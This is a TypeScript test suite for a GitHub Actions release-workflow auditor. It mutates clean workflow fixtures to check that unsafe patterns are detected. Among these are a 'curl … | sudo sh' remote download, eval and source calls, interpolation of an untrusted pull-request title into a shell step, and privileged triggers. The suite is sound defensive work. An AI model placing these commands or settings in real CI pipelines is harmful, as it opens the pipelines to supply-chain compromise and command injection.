import test from 'node:test';
import assert from 'node:assert/strict';
import {
  auditWorkflowEvidence,
  parseWorkflowEvidence,
  workflowEvidenceMarkdown,
} from './workflow-evidence-audit.mts';
import { fixtureFile, fixtureInventory, type FixtureFileInput } from './test-helpers.mts';

const CHECKOUT = '3d3c42e5aac5ba805825da76410c181273ba90b1';
const SETUP_NODE = '820762786026740c76f36085b0efc47a31fe5020';

function header(name: string, trigger = 'pull_request'): string {
  return `name: ${name}\n\non:\n  ${trigger}:\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: qa-\${{ github.event.pull_request.number || github.ref }}\n  cancel-in-progress: true\n\njobs:\n`;
}

function checkoutSteps(indent = '      '): string {
  return `${indent}- name: Checkout\n${indent}  uses: actions/checkout@${CHECKOUT} # v7\n${indent}  with:\n${indent}    persist-credentials: false\n\n${indent}- name: Setup Node 24\n${indent}  uses: actions/setup-node@${SETUP_NODE} # v7\n${indent}  with:\n${indent}    node-version: 24\n`;
}

function jobStart(name: string, timeout = 30, runner = 'ubuntu-latest'): string {
  return `  ${name}:\n    runs-on: ${runner}\n    timeout-minutes: ${timeout}\n    steps:\n`;
}

function namedRun(name: string, command = 'node --version'): string {
  return `      - name: ${name}\n        run: ${command}\n`;
}

function multilineRun(name: string, command: string): string {
  const body = command.split('\n').map(line => `          ${line}`).join('\n');
  return `      - name: ${name}\n        run: |\n${body}\n`;
}

function cleanWebclient(): FixtureFileInput {
  const exactType = [
    'BASE_SHA=${{ github.event.pull_request.base.sha }}',
    'git -C .. worktree add --detach /tmp/typecheck-baseline "$BASE_SHA"',
    "trap 'git -C .. worktree remove --force /tmp/typecheck-baseline' EXIT",
    'npx --no-install tsc --noEmit -p tsconfig.json',
  ].join('\n');
  const exactVitest = [
    'BASE_SHA=${{ github.event.pull_request.base.sha }}',
    'git -C .. worktree add --detach /tmp/vitest-baseline "$BASE_SHA"',
    "trap 'git -C .. worktree remove --force /tmp/vitest-baseline' EXIT",
    'npx --no-install vitest run',
  ].join('\n');
  return {
    path: '.github/workflows/webclient-quality.yml',
    text: header('Webclient Quality')
      + jobStart('quality', 90)
      + checkoutSteps()
      + namedRun('Install from lockfile', 'npm ci')
      + namedRun('Dependency and lockfile contract', 'npm run dependency:verify')
      + namedRun('Production dependency audit', 'npm audit --omit=dev --audit-level=high')
      + namedRun('Full lint visibility', 'npm run lint')
      + namedRun('Strict lint on changed Webclient sources', 'npx --no-install oxlint --deny-warnings src')
      + namedRun('Full TypeScript diagnostic visibility', 'npx --no-install tsc --noEmit -p tsconfig.json')
      + multilineRun('Exact-base TypeScript regression gate', exactType)
      + namedRun('Full Vitest diagnostic visibility', 'npx --no-install vitest run')
      + multilineRun('Exact-base Vitest regression gate', exactVitest)
      + namedRun('Native tooling regression suite', 'npm run test:tooling')
      + namedRun('Production Vite build and integrity manifest', 'npm run build')
      + namedRun('Verify production bundle integrity', 'npm run build:verify')
      + namedRun('Enforce production build budgets', 'node scripts/web-build-budget.mjs build --strict'),
  };
}

function cleanReleaseQa(): FixtureFileInput {
  const exactBase = [
    'BASE_SHA=${{ github.event.pull_request.base.sha }}',
    'git worktree add --detach /tmp/base "$BASE_SHA"',
    "trap 'git worktree remove --force /tmp/base' EXIT",
    'node --test quality/release/*.test.mts',
  ].join('\n');
  return {
    path: '.github/workflows/release-qa.yml',
    text: header('Release QA')
      + jobStart('typed-release-audit', 30)
      + checkoutSteps()
      + namedRun('TypeScript 7.0.2 strict typecheck', 'npx --no-install tsc -p quality/release/tsconfig.json')
      + namedRun('Typed QA unit and regression tests', 'node --test quality/release/*.test.mts')
      + namedRun('Generate whole-repository release scorecard', 'node quality/release/cli.mts --strict')
      + multilineRun('Enforce exact-base PR regression gate', exactBase)
      + jobStart('webclient-release-validation', 45)
      + checkoutSteps()
      + namedRun('Dependency and lockfile contract', 'npm run dependency:verify')
      + namedRun('Production dependency audit', 'npm audit --omit=dev --audit-level=high')
      + namedRun('Release build', 'npm run build')
      + jobStart('backend-release-validation', 30)
      + `      - name: Checkout\n        uses: actions/checkout@${CHECKOUT} # v7\n        with:\n          persist-credentials: false\n`
      + namedRun('Run xUnit v3 tests through Microsoft.Testing.Platform', 'dotnet run --project tests/Platform.Security.Tests/Platform.Security.Tests.csproj')
      + namedRun('Publish User API', 'dotnet publish Api.User/Api.User.csproj')
      + namedRun('Publish Admin API', 'dotnet publish Api.Admin/Api.Admin.csproj'),
  };
}

function cleanArchitecture(): FixtureFileInput {
  return {
    path: '.github/workflows/platform-architecture-audit.yml',
    text: header('Platform Architecture Audit')
      + jobStart('audit', 20)
      + checkoutSteps()
      + namedRun('Enforce modernization contracts', 'node --test tools/platform-modernization.test.mjs')
      + namedRun('Enforce typed module graph', 'node tools/platform-module-graph.mjs --strict')
      + namedRun('Enforce language modernization ratchet', 'node tools/platform-language-ratchet.mjs --strict')
      + namedRun('Enforce Platform responsibility boundaries', 'node tools/platform-boundary-audit.mjs --strict')
      + namedRun('Enforce browser runtime boundary', 'node tools/browser-runtime-boundary.mjs --strict')
      + namedRun('Audit package lock integrity', 'node tools/package-lock-integrity.mjs'),
  };
}

function cleanTypedPlatform(): FixtureFileInput {
  return {
    path: '.github/workflows/platform-typed-test-validation.yml',
    text: header('Platform Typed Test Validation')
      + jobStart('typed-platform-tests', 30)
      + checkoutSteps()
      + namedRun('Install from lockfile', 'npm ci')
      + namedRun('Production dependency audit', 'npm audit --omit=dev --audit-level=high')
      + namedRun('Enforce Platform language ratchet', 'node ../tools/platform-language-ratchet.mjs --strict')
      + namedRun('Strict Platform test TypeScript', 'npm run typecheck:platform-tests')
      + namedRun('Focused migrated Platform tests', 'npx --no-install vitest run src/platform'),
  };
}

function cleanEvidenceContract(): FixtureFileInput {
  return {
    path: '.github/workflows/release-evidence-contract.yml',
    text: header('Release Evidence Contract')
      + jobStart('contract', 10)
      + checkoutSteps()
      + namedRun('Audit adversarial fixture suite', 'node --test scripts/release-evidence-audit.test.mjs')
      + namedRun('Verify-chain bypass security contract', 'node --test scripts/verify-chain-security.test.mjs')
      + namedRun('Workflow supply-chain security contract', 'node --test scripts/workflow-security-contract.test.mjs')
      + namedRun('Workflow action allowlist contract', 'node --test scripts/workflow-action-allowlist-contract.test.mjs')
      + namedRun('Workflow shell security contract', 'node --test scripts/workflow-shell-security-contract.test.mjs')
      + namedRun('Workflow npx local-only security contract', 'node --test scripts/workflow-npx-security-contract.test.mjs')
      + namedRun('Workflow permission and trigger contract', 'node --test scripts/workflow-permissions-contract.test.mjs')
      + namedRun('Workflow bounded-execution reliability contract', 'node --test scripts/workflow-reliability-contract.test.mjs')
      + namedRun('Audit embedded smoke fixtures', 'node scripts/release-evidence-audit.mjs --self-test')
      + namedRun('Enforce candidate release evidence', 'node scripts/release-evidence-audit.mjs --strict'),
  };
}

function cleanInventory(overrides: Readonly<Record<string, string>> = {}) {
  const fixtures = [
    cleanWebclient(),
    cleanReleaseQa(),
    cleanArchitecture(),
    cleanTypedPlatform(),
    cleanEvidenceContract(),
  ].map(fixture => ({
    ...fixture,
    text: overrides[fixture.path] ?? fixture.text,
  }));
  return fixtureInventory(fixtures);
}

function findingIds(overrides: Readonly<Record<string, string>> = {}): readonly string[] {
  return auditWorkflowEvidence(cleanInventory(overrides)).findings.map(finding => finding.id);
}

function replaceFixture(path: string, transform: (value: string) => string): Readonly<Record<string, string>> {
  const fixture = [cleanWebclient(), cleanReleaseQa(), cleanArchitecture(), cleanTypedPlatform(), cleanEvidenceContract()]
    .find(candidate => candidate.path === path);
  if (!fixture) throw new Error(`missing fixture ${path}`);
  return Object.freeze({ [path]: transform(fixture.text) });
}

test('clean release workflow evidence passes', () => {
  const section = auditWorkflowEvidence(cleanInventory());
  assert.deepEqual(section.findings, []);
  assert.equal(section.summary.workflowCount, 5);
  assert.ok(section.summary.jobCount >= 7);
  assert.ok(section.summary.stepCount >= 35);
  assert.equal(section.summary.actionCount, section.summary.immutableActionCount);
  assert.ok(section.summary.exactBaseEvidenceCount >= 2);
});

test('parser extracts workflow metadata, jobs, actions and commands', () => {
  const parsed = parseWorkflowEvidence(fixtureFile(cleanWebclient()));
  assert.equal(parsed.name, 'Webclient Quality');
  assert.deepEqual(parsed.triggers, ['pull_request']);
  assert.equal(parsed.permissions.contents, 'read');
  assert.equal(parsed.cancelInProgress, true);
  assert.match(parsed.concurrencyGroup ?? '', /github\.event\.pull_request\.number/u);
  assert.equal(parsed.jobs.length, 1);
  assert.equal(parsed.jobs[0]?.name, 'quality');
  assert.equal(parsed.jobs[0]?.runner, 'ubuntu-latest');
  assert.equal(parsed.jobs[0]?.timeoutMinutes, 90);
  assert.ok(parsed.actions.some(action => action.action === 'actions/checkout'));
  assert.ok(parsed.commands.some(command => command.command === 'npm ci'));
});

test('parser marks reviewed full-SHA actions immutable', () => {
  const parsed = parseWorkflowEvidence(fixtureFile(cleanWebclient()));
  assert.ok(parsed.actions.length > 0);
  assert.equal(parsed.actions.every(action => action.immutable), true);
  assert.equal(parsed.actions.find(action => action.action === 'actions/checkout')?.ref, CHECKOUT);
});

test('parser classifies dependency, lint, typecheck, test and build commands', () => {
  const parsed = parseWorkflowEvidence(fixtureFile(cleanWebclient()));
  const steps = parsed.jobs[0]?.steps ?? [];
  assert.ok(steps.find(step => step.name === 'Install from lockfile')?.kinds.includes('dependency-install'));
  assert.ok(steps.find(step => step.name === 'Production dependency audit')?.kinds.includes('dependency-audit'));
  assert.ok(steps.find(step => step.name === 'Full lint visibility')?.kinds.includes('lint'));
  assert.ok(steps.find(step => step.name === 'Full TypeScript diagnostic visibility')?.kinds.includes('typecheck'));
  assert.ok(steps.find(step => step.name === 'Full Vitest diagnostic visibility')?.kinds.includes('test'));
  assert.ok(steps.find(step => step.name === 'Production Vite build and integrity manifest')?.kinds.includes('build'));
});

test('missing release-critical workflow is high severity evidence debt', () => {
  const inventory = fixtureInventory([
    cleanWebclient(),
    cleanReleaseQa(),
    cleanArchitecture(),
    cleanTypedPlatform(),
  ]);
  const section = auditWorkflowEvidence(inventory);
  const finding = section.findings.find(item => item.id === 'release-critical-workflow-missing');
  assert.equal(finding?.severity, 'high');
  assert.match(finding?.message ?? '', /release-evidence-contract/u);
});

test('workflow-level contents write is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('contents: read', 'contents: write'));
  assert.ok(findingIds(overrides).includes('release-workflow-permission-boundary'));
  assert.ok(findingIds(overrides).includes('release-workflow-write-permission'));
});

test('aggregate permission scalar is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('permissions:\n  contents: read', 'permissions: write-all'));
  assert.ok(findingIds(overrides).includes('release-workflow-permission-boundary'));
});

test('job-level write permission escalation is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('    runs-on: ubuntu-latest', '    permissions:\n      contents: write\n    runs-on: ubuntu-latest'));
  assert.ok(findingIds(overrides).includes('release-job-permission-escalation'));
});

test('read-only job permission override remains allowed', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('    runs-on: ubuntu-latest', '    permissions:\n      contents: read\n    runs-on: ubuntu-latest'));
  assert.equal(findingIds(overrides).includes('release-job-permission-escalation'), false);
});

test('privileged pull_request_target trigger is blocking', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('  pull_request:', '  pull_request_target:'));
  const section = auditWorkflowEvidence(cleanInventory(overrides));
  const finding = section.findings.find(item => item.id === 'release-workflow-privileged-trigger');
  assert.equal(finding?.severity, 'critical');
  assert.equal(finding?.blocking, true);
});

test('workflow_run trigger is blocking', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('  pull_request:', '  workflow_run:'));
  assert.ok(findingIds(overrides).includes('release-workflow-privileged-trigger'));
});

test('missing concurrency group is reported', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace(/concurrency:[\s\S]*?cancel-in-progress: true\n\n/u, ''));
  assert.ok(findingIds(overrides).includes('release-workflow-concurrency-gap'));
});

test('missing cancellation is reported', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('  cancel-in-progress: true\n', ''));
  assert.ok(findingIds(overrides).includes('release-workflow-concurrency-gap'));
});

test('self-hosted runner drift is reported', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('runs-on: ubuntu-latest', 'runs-on: self-hosted'));
  assert.ok(findingIds(overrides).includes('release-job-runner-drift'));
});

test('ubuntu-24.04 backend runner is accepted', () => {
  const overrides = replaceFixture('.github/workflows/release-qa.yml', text =>
    text.replace('  backend-release-validation:\n    runs-on: ubuntu-latest', '  backend-release-validation:\n    runs-on: ubuntu-24.04'));
  assert.equal(findingIds(overrides).filter(id => id === 'release-job-runner-drift').length, 0);
});

test('missing job timeout is reported', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('    timeout-minutes: 90\n', ''));
  assert.ok(findingIds(overrides).includes('release-job-timeout-gap'));
});

test('excessive job timeout is reported', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('timeout-minutes: 90', 'timeout-minutes: 121'));
  assert.ok(findingIds(overrides).includes('release-job-timeout-gap'));
});

test('mutable checkout tag is high-severity provenance debt', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace(`actions/checkout@${CHECKOUT} # v7`, 'actions/checkout@v7'));
  const section = auditWorkflowEvidence(cleanInventory(overrides));
  const finding = section.findings.find(item => item.id === 'release-action-mutable-provenance');
  assert.equal(finding?.severity, 'high');
});

test('mutable setup-node branch is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace(`actions/setup-node@${SETUP_NODE} # v7`, 'actions/setup-node@main'));
  assert.ok(findingIds(overrides).includes('release-action-mutable-provenance'));
});

test('checkout must disable persisted credentials', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('          persist-credentials: false\n', ''));
  assert.ok(findingIds(overrides).includes('release-checkout-credential-persistence'));
});

test('checkout persist-credentials true is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('persist-credentials: false', 'persist-credentials: true'));
  assert.ok(findingIds(overrides).includes('release-checkout-credential-persistence'));
});

test('setup-node must explicitly select Node 24', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('node-version: 24', 'node-version: 22'));
  assert.ok(findingIds(overrides).includes('release-node-runtime-drift'));
});

test('ordinary npx invocation is rejected as non-local-only', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('npx --no-install oxlint', 'npx oxlint'));
  assert.ok(findingIds(overrides).includes('release-npx-local-only-missing'));
});

test('npx --yes is rejected even with local-only flag', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('npx --no-install oxlint', 'npx --yes --no-install oxlint'));
  assert.ok(findingIds(overrides).includes('release-npx-auto-install'));
});

test('local-only npx invocation remains accepted', () => {
  assert.equal(findingIds().includes('release-npx-local-only-missing'), false);
});

test('curl download in a release shell is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: curl https://example.invalid/tool'));
  assert.ok(findingIds(overrides).includes('workflow-shell-remote-download'));
});

test('wget download in multiline shell is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: |\n          wget https://example.invalid/tool'));
  assert.ok(findingIds(overrides).includes('workflow-shell-remote-download'));
});

test('sudo execution is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: sudo npm ci'));
  assert.ok(findingIds(overrides).includes('workflow-shell-privilege-escalation'));
});

test('eval execution is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: eval "$COMMAND"'));
  assert.ok(findingIds(overrides).includes('workflow-shell-dynamic-eval'));
});

test('source execution is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: source ./ci.env'));
  assert.ok(findingIds(overrides).includes('workflow-shell-dynamic-source'));
});

test('npm install is rejected while npm ci is accepted', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: npm install'));
  assert.ok(findingIds(overrides).includes('workflow-shell-unlocked-install'));
  assert.equal(findingIds().includes('workflow-shell-unlocked-install'), false);
});

test('untrusted pull-request title interpolation in run is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: echo "${{ github.event.pull_request.title }}"'));
  assert.ok(findingIds(overrides).includes('release-shell-untrusted-expression'));
});

test('workflow input interpolation in run is rejected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: echo "${{ inputs.command }}"'));
  assert.ok(findingIds(overrides).includes('release-shell-untrusted-expression'));
});

test('immutable github.sha interpolation remains allowed', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: echo "${{ github.sha }}"'));
  assert.equal(findingIds(overrides).includes('release-shell-untrusted-expression'), false);
});

test('webclient required release step removal is detected', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace(namedRun('Verify production bundle integrity', 'npm run build:verify'), ''));
  assert.ok(findingIds(overrides).includes('release-required-step-missing'));
});

test('release QA required lane removal is detected', () => {
  const overrides = replaceFixture('.github/workflows/release-qa.yml', text =>
    text.replace('  webclient-release-validation:\n', '  renamed-webclient-validation:\n'));
  assert.ok(findingIds(overrides).includes('release-lane-missing'));
});

test('release QA typed regression evidence removal is detected', () => {
  const overrides = replaceFixture('.github/workflows/release-qa.yml', text =>
    text.replace(namedRun('Typed QA unit and regression tests', 'node --test quality/release/*.test.mts'), ''));
  assert.ok(findingIds(overrides).includes('release-required-step-missing'));
});

test('architecture boundary evidence removal is detected', () => {
  const overrides = replaceFixture('.github/workflows/platform-architecture-audit.yml', text =>
    text.replace(namedRun('Enforce Platform responsibility boundaries', 'node tools/platform-boundary-audit.mjs --strict'), ''));
  assert.ok(findingIds(overrides).includes('release-required-step-missing'));
});

test('typed Platform strict TypeScript evidence removal is detected', () => {
  const overrides = replaceFixture('.github/workflows/platform-typed-test-validation.yml', text =>
    text.replace(namedRun('Strict Platform test TypeScript', 'npm run typecheck:platform-tests'), ''));
  assert.ok(findingIds(overrides).includes('release-required-step-missing'));
});

test('release evidence adversarial suite removal is detected', () => {
  const overrides = replaceFixture('.github/workflows/release-evidence-contract.yml', text =>
    text.replace(namedRun('Workflow shell security contract', 'node --test scripts/workflow-shell-security-contract.test.mjs'), ''));
  assert.ok(findingIds(overrides).includes('release-required-step-missing'));
});

test('webclient regression baseline must use exact PR base SHA', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replaceAll('github.event.pull_request.base.sha', 'github.ref'));
  assert.ok(findingIds(overrides).includes('release-exact-base-source-missing'));
});

test('release QA regression baseline must use exact PR base SHA', () => {
  const overrides = replaceFixture('.github/workflows/release-qa.yml', text =>
    text.replaceAll('github.event.pull_request.base.sha', 'github.ref'));
  assert.ok(findingIds(overrides).includes('release-exact-base-source-missing'));
});

test('detached worktree isolation is mandatory', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replaceAll('worktree add --detach', 'worktree add'));
  assert.ok(findingIds(overrides).includes('release-exact-base-worktree-missing'));
});

test('baseline worktree cleanup is mandatory', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replaceAll('worktree remove --force', 'worktree prune'));
  assert.ok(findingIds(overrides).includes('release-baseline-cleanup-missing'));
});

test('webclient exact-base type gate must precede exact-base Vitest', () => {
  const original = cleanWebclient().text;
  const typeStart = original.indexOf('      - name: Exact-base TypeScript regression gate');
  const vitestStart = original.indexOf('      - name: Full Vitest diagnostic visibility');
  assert.ok(typeStart > 0 && vitestStart > typeStart);
  const before = original.slice(0, typeStart);
  const typeBlock = original.slice(typeStart, vitestStart);
  const after = original.slice(vitestStart);
  const moved = before + after + typeBlock;
  assert.ok(findingIds({ '.github/workflows/webclient-quality.yml': moved }).includes('release-webclient-gate-order'));
});

test('webclient build cannot move ahead of exact-base test evidence', () => {
  const original = cleanWebclient().text;
  const build = namedRun('Production Vite build and integrity manifest', 'npm run build');
  const without = original.replace(build, '');
  const moved = without.replace(
    namedRun('Full Vitest diagnostic visibility', 'npx --no-install vitest run'),
    build + namedRun('Full Vitest diagnostic visibility', 'npx --no-install vitest run'),
  );
  assert.ok(findingIds({ '.github/workflows/webclient-quality.yml': moved }).includes('release-webclient-gate-order'));
});

test('release QA publish commands classify as publish evidence', () => {
  const parsed = parseWorkflowEvidence(fixtureFile(cleanReleaseQa()));
  const publish = parsed.jobs.flatMap(job => job.steps).filter(step => step.kinds.includes('publish'));
  assert.deepEqual(publish.map(step => step.name), ['Publish User API', 'Publish Admin API']);
});

test('release QA exact-base command classifies as baseline evidence', () => {
  const parsed = parseWorkflowEvidence(fixtureFile(cleanReleaseQa()));
  assert.ok(parsed.jobs.flatMap(job => job.steps).some(step => step.kinds.includes('regression-baseline')));
});

test('multiline run body preserves commands for security analysis', () => {
  const parsed = parseWorkflowEvidence(fixtureFile(cleanWebclient()));
  const exact = parsed.jobs[0]?.steps.find(step => step.name === 'Exact-base TypeScript regression gate');
  assert.match(exact?.run?.command ?? '', /worktree add --detach/u);
  assert.match(exact?.run?.command ?? '', /npx --no-install tsc/u);
});

test('workflow evidence markdown exposes auditable lane summary', () => {
  const section = auditWorkflowEvidence(cleanInventory());
  const markdown = workflowEvidenceMarkdown(section);
  assert.match(markdown, /# Release Workflow Evidence/u);
  assert.match(markdown, /Webclient Quality/u);
  assert.match(markdown, /Release QA/u);
  assert.match(markdown, /Immutable actions:/u);
  assert.match(markdown, /Exact-base evidence commands:/u);
});

test('finding order remains deterministic regardless of fixture order', () => {
  const fixtures = [cleanWebclient(), cleanReleaseQa(), cleanArchitecture(), cleanTypedPlatform(), cleanEvidenceContract()];
  const first = auditWorkflowEvidence(fixtureInventory(fixtures)).findings.map(item => item.id);
  const second = auditWorkflowEvidence(fixtureInventory([...fixtures].reverse())).findings.map(item => item.id);
  assert.deepEqual(second, first);
});

test('non-critical workflow is parsed but does not create release-specific required-step debt', () => {
  const extra: FixtureFileInput = {
    path: '.github/workflows/docs.yml',
    text: header('Docs') + jobStart('docs', 10) + `      - run: echo docs\n`,
  };
  const inventory = fixtureInventory([
    cleanWebclient(), cleanReleaseQa(), cleanArchitecture(), cleanTypedPlatform(), cleanEvidenceContract(), extra,
  ]);
  const section = auditWorkflowEvidence(inventory);
  assert.deepEqual(section.findings, []);
  assert.equal(section.summary.workflowCount, 5);
});

test('docker action is not misreported as a mutable GitHub action reference', () => {
  const text = cleanEvidenceContract().text.replace(
    `      - name: Checkout\n        uses: actions/checkout@${CHECKOUT} # v7\n        with:\n          persist-credentials: false\n`,
    '      - name: Container helper\n        uses: docker://node:24\n',
  );
  const ids = findingIds({ '.github/workflows/release-evidence-contract.yml': text });
  assert.equal(ids.includes('release-action-mutable-provenance'), false);
});

test('local composite action is not treated as a mutable remote ref', () => {
  const text = cleanEvidenceContract().text.replace(
    `      - name: Checkout\n        uses: actions/checkout@${CHECKOUT} # v7\n        with:\n          persist-credentials: false\n`,
    '      - name: Local helper\n        uses: ./.github/actions/helper\n',
  );
  const ids = findingIds({ '.github/workflows/release-evidence-contract.yml': text });
  assert.equal(ids.includes('release-action-mutable-provenance'), false);
});

test('action parser retains release provenance comment', () => {
  const parsed = parseWorkflowEvidence(fixtureFile(cleanEvidenceContract()));
  const checkout = parsed.actions.find(action => action.action === 'actions/checkout');
  assert.equal(checkout?.comment, 'v7');
});

test('command parser does not classify script filenames containing npx as direct npx execution', () => {
  const text = cleanEvidenceContract().text.replace(
    'node scripts/release-evidence-audit.mjs --self-test',
    'node scripts/npx-policy.mjs',
  );
  const ids = findingIds({ '.github/workflows/release-evidence-contract.yml': text });
  assert.equal(ids.includes('release-npx-local-only-missing'), false);
});

test('multiple unsafe shell primitives are reported independently', () => {
  const overrides = replaceFixture('.github/workflows/webclient-quality.yml', text =>
    text.replace('run: npm ci', 'run: curl https://example.invalid/tool | sudo sh'));
  const ids = findingIds(overrides);
  assert.ok(ids.includes('workflow-shell-remote-download'));
  assert.ok(ids.includes('workflow-shell-privilege-escalation'));
});

test('summary counts remain internally consistent', () => {
  const section = auditWorkflowEvidence(cleanInventory());
  const steps = section.summary.workflows.reduce(
    (sum, workflow) => sum + workflow.jobs.reduce((jobSum, job) => jobSum + job.steps.length, 0),
    0,
  );
  const jobs = section.summary.workflows.reduce((sum, workflow) => sum + workflow.jobs.length, 0);
  const actions = section.summary.workflows.reduce((sum, workflow) => sum + workflow.actions.length, 0);
  assert.equal(section.summary.stepCount, steps);
  assert.equal(section.summary.jobCount, jobs);
  assert.equal(section.summary.actionCount, actions);
});
